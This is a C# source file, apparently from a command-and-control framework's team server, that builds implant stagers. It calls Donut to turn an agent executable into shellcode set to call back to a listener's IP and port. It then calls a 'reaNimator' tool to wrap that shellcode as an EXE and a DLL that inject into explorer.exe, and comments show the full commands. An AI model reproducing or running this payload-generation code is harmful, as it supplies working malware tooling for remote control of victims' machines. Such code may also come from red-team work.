using Microsoft.Extensions.Configuration;
using Microsoft.Extensions.Logging;
using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using TeamServer.Models;

namespace TeamServer.Services
{
    public class BinMakerService : IBinMakerService
    {
        private readonly IFileService _fileService;
        private readonly IConfiguration _configuration;
        private readonly ILoggerFactory _loggerFactory;
        private readonly ILogger _logger;
        public BinMakerService(IFileService fileService, IConfiguration configuration, ILoggerFactory loggerFactory)
        {
            _fileService = fileService;
            _configuration = configuration;
            _loggerFactory = loggerFactory;

            _logger = _loggerFactory.CreateLogger("BinMaker");
        }

        public string DonutFolder => _configuration.GetValue<string>("DonutFolder");
        public string ReaNimatorFolder => _configuration.GetValue<string>("ReaNimatorFolder");
        public string GeneratedAgentBinFileName => _configuration.GetValue<string>("GeneratedAgentBinFileName");
        public string GeneratedAgentExeFileName => _configuration.GetValue<string>("GeneratedAgentExeFileName");
        public string GeneratedAgentDllFileName => _configuration.GetValue<string>("GeneratedAgentDllFileName");

        public string SourceAgentExePath => _configuration.GetValue<string>("SourceAgentExePath");

        public string GenerateStagersFor(Listener listener)
        {
            string gen = this.GenerateExeStager(listener);
            gen += this.GenerateDllStager(listener);
            return gen;
        }

        public string GenerateBinStager(Listener listener)
        {
            var cmd = Path.Combine(DonutFolder, "donut");
            var inputFile = this.SourceAgentExePath;
            var outFile = Path.Combine(this._fileService.GetListenerPath(listener.Name), this.GeneratedAgentBinFileName);

            if (!Directory.Exists(this._fileService.GetListenerPath(listener.Name)))
                Directory.CreateDirectory(this._fileService.GetListenerPath(listener.Name));

            List<string> args = new List<string>();
            args.Add(inputFile);
            args.Add("-f 1");
            args.Add("-a 2");
            args.Add($"-o");
            args.Add(outFile);
            args.Add($"-p");
            args.Add($"{listener.Protocol}:{listener.Ip}:{listener.PublicPort}");

            //string args = $"'{inputFile}' -f 1 -a 2 -o '{outFile}' -p '{listener.Ip}:{listener.BindPort}'";
            _logger.LogInformation($"Executing {cmd} {string.Join(' ', args)}");
            var ret = ExecuteCommand(cmd, args, this.DonutFolder);
            return ret;
        }

        public string GenerateExeStager(Listener listener)
        {
            var res = GenerateBinStager(listener);
            res += Environment.NewLine;
            res += GenerateExeStagerFromBin(listener);
            return res;
        }

        public string GenerateDllStager(Listener listener)
        {
            var res = GenerateBinStager(listener);
            res += Environment.NewLine;
            res += GenerateDllStagerFromBin(listener);
            return res;
        }
        public string GenerateExeStagerFromBin(Listener listener)
        {
            var cmd = Path.Combine(ReaNimatorFolder, "reaNimator");
            var inputFile = Path.Combine(this._fileService.GetListenerPath(listener.Name), this.GeneratedAgentBinFileName);
            var outFile = Path.Combine(this._fileService.GetListenerPath(listener.Name), this.GeneratedAgentExeFileName);

            if (!Directory.Exists(this._fileService.GetListenerPath(listener.Name)))
                Directory.CreateDirectory(this._fileService.GetListenerPath(listener.Name));

            List<string> args = new List<string>();
            args.Add("-f");
            args.Add(inputFile);
            args.Add("-t");
            args.Add("raw");
            args.Add($"-o");
            args.Add(outFile);
            args.Add($"-e");
            args.Add($"-u");
            args.Add($"-p");
            args.Add($"explorer.exe");

            //reaNimator -f /Share/tmp/Stager/agent.bin -t raw -o /Share/tmp/Stager/TestSelf.exe -e -u -p "explorer.exe"
            _logger.LogInformation($"Executing {cmd} {string.Join(' ', args)}");
            var ret = ExecuteCommand(cmd, args, this.ReaNimatorFolder);
            return ret;
        }

        public string GenerateDllStagerFromBin(Listener listener)
        {
            var cmd = Path.Combine(ReaNimatorFolder, "reaNimator");
            var inputFile = Path.Combine(this._fileService.GetListenerPath(listener.Name), this.GeneratedAgentBinFileName);
            var outFile = Path.Combine(this._fileService.GetListenerPath(listener.Name), this.GeneratedAgentDllFileName);

            if (!Directory.Exists(this._fileService.GetListenerPath(listener.Name)))
                Directory.CreateDirectory(this._fileService.GetListenerPath(listener.Name));

            List<string> args = new List<string>();
            args.Add("-f");
            args.Add(inputFile);
            args.Add("-t");
            args.Add("raw");
            args.Add($"-o");
            args.Add(outFile);
            args.Add($"-e");
            args.Add($"-u");
            args.Add($"-b");
            args.Add($"-p");
            args.Add($"explorer.exe");

            //reaNimator -f /Share/tmp/Stager/agent.bin -t raw -o /Share/tmp/Stager/TestSelf.exe -e -u -p "explorer.exe"
            _logger.LogInformation($"Executing {cmd} {string.Join(' ', args)}");
            var ret = ExecuteCommand(cmd, args, this.ReaNimatorFolder);
            return ret;
        }

        public string ExecuteCommand(string fileName, List<string> args, string startIn)
        {
            //var startInfo = new ProcessStartInfo()
            //{
            //    FileName = fileName,
            //    Arguments = args,
            //    WorkingDirectory = startIn,
            //    RedirectStandardError = true,
            //    RedirectStandardOutput = true,
            //    UseShellExecute = false,
            //    CreateNoWindow = true,

            //};

            //var process = new Process
            //{
            //    StartInfo = startInfo,
            //};


            Collection<string> collection = new Collection<string>(args);

            var psi =
            new ProcessStartInfo
            {
                FileName = fileName,
                RedirectStandardError = true,
                RedirectStandardOutput = true,
                WorkingDirectory = startIn,
            };

            foreach (var arg in args)
                psi.ArgumentList.Add(arg);

            var process = Process.Start(psi);




            string output = string.Empty;
            process.OutputDataReceived += (s, e) => { output += e.Data + Environment.NewLine; };
            process.ErrorDataReceived += (s, e) => { output += e.Data + Environment.NewLine; };

            process.Start();

            process.BeginOutputReadLine();
            process.BeginErrorReadLine();

            process.WaitForExit();

            return output;
        }
    }
}
